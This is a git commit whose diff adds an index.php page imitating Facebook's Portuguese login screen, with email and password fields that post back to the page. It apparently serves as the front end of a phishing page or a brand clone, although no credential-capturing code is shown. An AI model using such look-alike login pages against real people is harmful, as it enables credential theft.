b3d3d7dc86647e09881c11ed74c504607ca6534b
SMCodes <samuelpvp20@gmail.com>
2019-10-13 12:46:05 -0300

    1.0.0

---
+++ index.php
@@ -0,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Facebook - Entrar & Registrar</title>
+	<link rel="stylesheet" type="text/css" href="assets/css/index.css">
+</head>
+<body>
+
+	<div id="menu">
+		<div id="login">
+			<div id="form">
+				<ul>
+					<form method="POST">
+						<li style="margin-left: 12px !important;">
+							Email ou telefone
+						</li>
+						<li style="margin-left: 117px !important;">
+							Senha
+						</li>
+						<br/>
+						<input type="text" name="email">
+						<input type="password" name="senha">
+						<input type="submit" name="Entrar" placeholder="Entrar" value="Entrar" id="button">
+						<p id="esq">
+							Esqueceu a conta?
+						</p>
+					</form>
+				</ul>
+			</div>
+		</div>
+		<h1 id="titulo">
+			Facebook
+		</h1>
+	</div>
+
+</body>
+</html>
